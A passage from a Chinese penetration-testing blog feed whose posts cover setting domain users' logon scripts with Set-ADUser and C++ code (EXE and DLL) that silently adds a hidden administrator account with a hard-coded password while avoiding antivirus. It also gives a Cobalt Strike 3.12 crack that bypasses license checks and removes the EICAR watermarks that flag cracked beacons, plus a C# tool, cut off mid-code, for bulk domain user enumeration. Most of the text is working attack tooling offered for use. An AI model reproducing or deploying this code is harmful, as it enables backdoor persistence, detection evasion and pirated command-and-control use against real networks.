class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory.psd1; 或者Import-Module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADUser -Identity AD_USER -ProfilePath &quot;filepath&quot; -ScriptPath &quot;filename&quot;</span><br></pre></td></tr></table></figure></p><p>参数说明</p><ul><li><p>Identity<br>通过提供以下属性值之一指定Active Directory用户对象。括号中的标识符是属性的LDAP显示名称。此参数的可接受值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一个名字</span><br><span class="line">GUID（objectGUID）</span><br><span class="line">安全标识符（objectSid）</span><br><span class="line">SAM帐户名称（sAMAccountName）</span><br></pre></td></tr></table></figure></li><li><p>ProfilePath<br>指定用户配置文件的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</p></li><li>ScriptPath<br>指定用户登录脚本的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</li></ul><p>测试结果与第一种方法一致</p><h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p><a href="http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/</a><br><a href="https://www.t00ls.net/thread-48540-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-48540-1-1.html</a><br><a href="https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html" target="_blank" rel="noopener">https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html</a><br><a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;#DC143C&quot; size=&quot;3&quot;&gt;摘要：&lt;/font&gt;采取直接的手段不能够解决问题，只好曲线救国。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【C++】创建用户，并添加至管理组</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90C-%E3%80%91%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E8%87%B3%E7%AE%A1%E7%90%86%E7%BB%84/"/>
    <id>https://rcoil.me/2018/11/【C-】创建用户，并添加至管理组/</id>
    <published>2018-11-15T03:52:27.000Z</published>
    <updated>2018-11-17T16:49:28.274Z</updated>
    
    <content type="html"><![CDATA[<p>摘要: 因有些需求，需要本地/远程添加用户。所以直接选择<code>Windows API函数</code>进行编写，因为部分杀软限制了<code>CMD</code>。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">程序名称：添加系统用户.exe(也可创建dll)</span><br><span class="line">编译平台：VS2015 C# (.NET Framework v4.0)、Windows 7 Ultimate x64</span><br><span class="line">编写语言：C++ (C#存在版本限制)</span><br><span class="line">测试条件：以管理员运行</span><br><span class="line">测试工具：zzz_exploit or other</span><br><span class="line">测试平台：xp-x64、win2003-x86、win7-x64、win2008-x64、win10-x64(火绒) --&gt;均可成功添加</span><br></pre></td></tr></table></figure></p><h2 id="0x00-思路及原理"><a href="#0x00-思路及原理" class="headerlink" title="0x00 思路及原理"></a>0x00 思路及原理</h2><h3 id="一）编程思路"><a href="#一）编程思路" class="headerlink" title="一）编程思路"></a>一）编程思路</h3><p>使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/nf-lmaccess-netuseradd" target="_blank" rel="noopener">NetUserAdd函数</a>添加普通权限的用户并指定级别。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NET_API_STATUS NET_API_FUNCTION <span class="title">NetUserAdd</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR servername, <span class="comment">// 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   level, <span class="comment">// 指定数据的信息级别。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  buf, <span class="comment">// 指向指定数据的缓冲区的指针。此数据的格式取决于level参数的值。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD parm_err</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><p>使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers" target="_blank" rel="noopener">NetLocalGroupAddMembers函数</a>将现有用户账号添加到现有本地组。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NET_API_STATUS NET_API_FUNCTION <span class="title">NetLocalGroupAddMembers</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR servername, <span class="comment">// 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR groupname, <span class="comment">// 指向常量字符串的指针，该字符串指定将向其添加指定用户或全局组的本地组的名称。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   level, <span class="comment">// 指定数据的信息级别。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  buf, <span class="comment">// 指向包含新本地组成员数据的缓冲区的指针。此数据的格式取决于level参数的值。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   totalentries <span class="comment">// 指定buf参数指向的缓冲区中的条目数。</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><h3 id="二）编写思路"><a href="#二）编写思路" class="headerlink" title="二）编写思路"></a>二）编写思路</h3><ul><li>定义USER_INFO_1 结构体<br>该结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。</li><li>调用NetUserAdd添加普通权限账户</li><li>调用NetLocalGroupAddMembers添加到管理员组</li></ul><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><h3 id="一）exe生成"><a href="#一）exe生成" class="headerlink" title="一）exe生成"></a>一）exe生成</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UserInfoAdd.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"netapi32"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;lm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 定义USER_INFO_1结构体</span></span><br><span class="line">USER_INFO_1 UserInfo;</span><br><span class="line">DWORD dwLevel = <span class="number">1</span>;</span><br><span class="line">DWORD dwError = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">UserInfo.usri1_name = <span class="string">L"Admins"</span>;            <span class="comment">// 账户    </span></span><br><span class="line">UserInfo.usri1_password = <span class="string">L"P@ssword233"</span>;      <span class="comment">// 密码</span></span><br><span class="line">UserInfo.usri1_priv = USER_PRIV_USER;</span><br><span class="line">UserInfo.usri1_home_dir = <span class="literal">NULL</span>;</span><br><span class="line">UserInfo.usri1_comment = <span class="literal">NULL</span>;</span><br><span class="line">UserInfo.usri1_flags = UF_SCRIPT;</span><br><span class="line">UserInfo.usri1_script_path = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加名为Admins的用户,密码为P@ssword233 </span></span><br><span class="line">NetUserAdd(<span class="literal">NULL</span>, dwLevel, (LPBYTE)&amp;UserInfo, &amp;dwError);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加用户到administrators组</span></span><br><span class="line">LOCALGROUP_MEMBERS_INFO_3 account;</span><br><span class="line">account.lgrmi3_domainandname = UserInfo.usri1_name;</span><br><span class="line">NetLocalGroupAddMembers(<span class="literal">NULL</span>, <span class="string">L"Administrators"</span>, <span class="number">3</span>, (LPBYTE)&amp;account, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二）dll生成"><a href="#二）dll生成" class="headerlink" title="二）dll生成"></a>二）dll生成</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#ifndef UNICODE</span><br><span class="line">#define UNICODE</span><br><span class="line">#endif</span><br><span class="line">#pragma comment(lib,&quot;netapi32&quot;)</span><br><span class="line"></span><br><span class="line">#include  &lt;stdio.h&gt;</span><br><span class="line">#include  &lt;windows.h&gt;</span><br><span class="line">#include &lt;tchar.h&gt;  </span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include  &lt;lm.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;atlimage.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int NetUserAdd()</span><br><span class="line">&#123;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) &#123;</span><br><span class="line">switch (dwReason) &#123;</span><br><span class="line">case DLL_PROCESS_ATTACH:</span><br><span class="line">NetUserAdd();</span><br><span class="line">break;</span><br><span class="line">case DLL_PROCESS_DETACH:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在编译代码的时候，选择MT，所有的依赖文件都会编进去。<br><img src="/image/创建用户，并添加至管理组/blog_2018-11-15_11-35-4320.png" alt="blog_2018-11-15_11-35-4320"></p><h2 id="0x02-备注"><a href="#0x02-备注" class="headerlink" title="0x02 备注"></a>0x02 备注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">支持最低客户端:Windows 2000 Professional [仅desktop apps]</span><br><span class="line">支持最低服务器:Windows 2000 Server [仅desktop apps]</span><br><span class="line">目标平台: Windows</span><br><span class="line">Header: lmaccess.h (include Lm.h)</span><br><span class="line">Library: Netapi32.lib</span><br><span class="line">DLL: Netapi32.dll</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要: 因有些需求，需要本地/远程添加用户。所以直接选择&lt;code&gt;Windows API函数&lt;/code&gt;进行编写，因为部分杀软限制了&lt;code&gt;CMD&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="C++" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike 3.12 破解</title>
    <link href="https://rcoil.me/2018/10/CobaltStrike-3-12-%E7%A0%B4%E8%A7%A3/"/>
    <id>https://rcoil.me/2018/10/CobaltStrike-3-12-破解/</id>
    <published>2018-10-21T07:40:19.000Z</published>
    <updated>2018-11-17T04:27:44.529Z</updated>
    
    <content type="html"><![CDATA[<p>听说有更新，所以就拿来看看，按照3.8的破解流程。<br><a id="more"></a></p><h2 id="0x00-Cobalt-Strike3-12-下载"><a href="#0x00-Cobalt-Strike3-12-下载" class="headerlink" title="0x00 Cobalt Strike3.12 下载"></a>0x00 Cobalt Strike3.12 下载</h2><p>原版：<a href="https://github.com/microidz/Cobaltstrike-Trial" target="_blank" rel="noopener">https://github.com/microidz/Cobaltstrike-Trial</a></p><p>校验：<a href="https://verify.cobaltstrike.com/" target="_blank" rel="noopener">https://verify.cobaltstrike.com/</a></p><p>xor.bin：<a href="https://github.com/verctor/CS_xor64" target="_blank" rel="noopener">https://github.com/verctor/CS_xor64</a></p><p>破解记录</p><h2 id="0x01-文件文件位置"><a href="#0x01-文件文件位置" class="headerlink" title="0x01 文件文件位置"></a>0x01 文件文件位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">common/License.class  # 修改时间及提示框</span><br><span class="line">common/ArtifactUtils.class  # 去除后门特征指纹</span><br><span class="line">server/ProfileEdits.class # 去除后门特征指纹</span><br><span class="line">aggressor/dialogs/ListenerDialog.class  # 去除listener个数限制</span><br><span class="line">aggressor/AggressorClient.class  # 标题栏修改</span><br><span class="line">resources/xor.bin  # 放入xor.bin文件</span><br><span class="line">resources/xor64.bin  # 放入xor.bin文件</span><br></pre></td></tr></table></figure><h2 id="0x02-License-class"><a href="#0x02-License-class" class="headerlink" title="0x02 License.class"></a>0x02 License.class</h2><p>首先将cobaltstrike.jar以压缩包格式打开，复制License.class出来，然后运行<code>jad.exe License.class</code>，jad目录下就会生成<code>License.jad</code>，修改后缀为<code>Java</code>，即是源码文件了。</p><p>这里将提供两种破解思路。</p><ul><li><p>(1) 直接修改试用时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> life = <span class="number">21L</span>;</span><br><span class="line">将<span class="number">21</span>天的试用期修改成</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> life = <span class="number">99999L</span>;</span><br></pre></td></tr></table></figure></li><li><p>(2) 修改isTrail的判断逻辑 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isTrial</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">修改成</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isTrial</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><p>往下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseGUI</span><span class="params">(Authorization auth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line">修改成</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseGUI</span><span class="params">(Authorization authorization)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">同理</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseConsole</span><span class="params">(Authorization authorization)</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-去除listener个数限制"><a href="#0x03-去除listener个数限制" class="headerlink" title="0x03 去除listener个数限制"></a>0x03 去除listener个数限制</h2><p>文件在<code>aggressor/dialogs/ListenerDialog.class</code></p><p>去除<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Listener.isEgressBeacon(payload) &amp;&amp; DataUtils.isBeaconDefined(datal) &amp;&amp; !name.equals(DataUtils.getEgressBeaconListener(datal)))</span><br><span class="line">        &#123;</span><br><span class="line">            DialogUtils.showError(<span class="string">"You may only define one egress Beacon per team server.\nThere are a few things I need to sort before you can\nput multiple Beacon HTTP/DNS listeners on one server.\nSpin up a new team server and add your listener there."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br></pre></td></tr></table></figure></p><h2 id="0x04-后门特征指纹"><a href="#0x04-后门特征指纹" class="headerlink" title="0x04 后门特征指纹"></a>0x04 后门特征指纹</h2><p>存在后门特征指纹的其中两个地方</p><p>common/ArtifactUtils.class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">packer.addString(<span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br></pre></td></tr></table></figure></p><p>server/ProfileEdits.class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c2profile.addCommand(<span class="string">".http-get.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".http-post.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".http-stager.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".stage.transform-x86"</span>, <span class="string">"append"</span>, <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".stage.transform-x64"</span>, <span class="string">"append"</span>, <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br></pre></td></tr></table></figure></p><h2 id="0x05-结果"><a href="#0x05-结果" class="headerlink" title="0x05 结果"></a>0x05 结果</h2><p>最后使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -classpath cobaltstrike.jar xxxx.java</span><br></pre></td></tr></table></figure></p><p>进行编译<br><img src="/image/CobaltStrike-3-12-破解/Snipaste_2018-11-08_17-38-29.PNG" alt="Snipaste_2018-11-08_17-38-29"></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/2170" target="_blank" rel="noopener">https://xz.aliyun.com/t/2170</a><br><a href="https://www.cnblogs.com/ssooking/p/9825917.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssooking/p/9825917.html</a><br><a href="https://www.bilibili.com/video/av34171888/" target="_blank" rel="noopener">https://www.bilibili.com/video/av34171888/</a><br><a href="https://github.com/Lz1y/cobalt_strike_3.12_patch" target="_blank" rel="noopener">https://github.com/Lz1y/cobalt_strike_3.12_patch</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;听说有更新，所以就拿来看看，按照3.8的破解流程。&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="https://rcoil.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】批量 Net User Uname /domain</title>
    <link href="https://rcoil.me/2018/08/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91-%E6%89%B9%E9%87%8FNet-User/"/>
    <id>https://rcoil.me/2018/08/【域渗透】-批量Net-User/</id>
    <published>2018-08-01T09:32:25.000Z</published>
    <updated>2019-04-19T07:09:57.662Z</updated>
    
    <content type="html"><![CDATA[<p>域内批量执行 <code>net user Uname /domain</code></p><a id="more"></a><h2 id="0x00使用场景"><a href="#0x00使用场景" class="headerlink" title="0x00使用场景"></a>0x00使用场景</h2><p>在渗透测试中，需要查找域内某用户的机器所在，必须得确定目标人物所对应的域用户。<br>查找域用户对应的 <code>Full Name</code> 信息，从而确认目标任务对应的域用户。</p><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><p>代码其实很简单，使用 C# 进行编写，可自行编译。</p><p>将所有域用户导入<code>user.txt</code>中（每个域用户一行），遍历文件中的用户，然后调用系统cmd命令执行<code>net user Uname /domain</code>，将运行结果进行输出，可根据自己需求进行二次修改（线程、正则、输出保存）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line">namespace domain</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">        Console.WriteLine(&quot;Tools By RcoIl \r&quot;);</span><br><span class="line">            string currentDirectory = Environment.CurrentDirectory;</span><br><span class="line">            string text = currentDirectory + &quot;\\user.txt&quot;; // 文件绝对路径</span><br><span class="line">            if (!File.Exists(text))</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(&quot;File not found &quot; + text); </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                FileStream stream = new FileStream(text, FileMode.Open, FileAccess.Read); // 打开文本</span><br><span class="line">                try</span><br><span class="line">                &#123;</span><br><span class="line">                    StreamReader streamReader = new StreamReader(stream, Encoding.Default); // 实例化</span><br><span class="line">                    try</span><br><span class="line">                    &#123;</span><br><span class="line">                        while (!streamReader.EndOfStream) // 读取文本</span><br><span class="line">                        &#123;</span><br><span class="line">                            string text2;</span><br><span class="line">                            if ((text2 = streamReader.ReadLine()) != null &amp;&amp; text2.Length != 0) </span><br><span class="line">                            &#123;</span><br><span class="line">                                string id = text2;</span><br><span class="line">                                Program.Check(id);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    finally</span><br><span class="line">                    &#123;</span><br><span class="line">                        if (streamReader != null)</span><br><span class="line">                        &#123;</span><br><span class="line">                            ((IDisposable)streamReader).Dispose();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                finally</span><br><span class="line">                &#123;</span><br><span class="line">                    if (stream != null)</span><br><span class="line">                    &#123;</span><br><span class="line">                        ((IDisposable)stream).Dispose();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Console.WriteLine(&quot;============================================================&quot;);</span><br><span class="line">                Console.WriteLine(&quot;Finish!&quot;);</span><br><span class="line">                GC.Collect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void Check(string id)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.ProcessStartInfo proccessStartInfo = new System.Diagnostics.ProcessStartInfo(&quot;net&quot;, &quot;user &quot; + id + &quot; /domain&quot;);</span><br><span class="line">            proccessStartInfo.CreateNoWindow 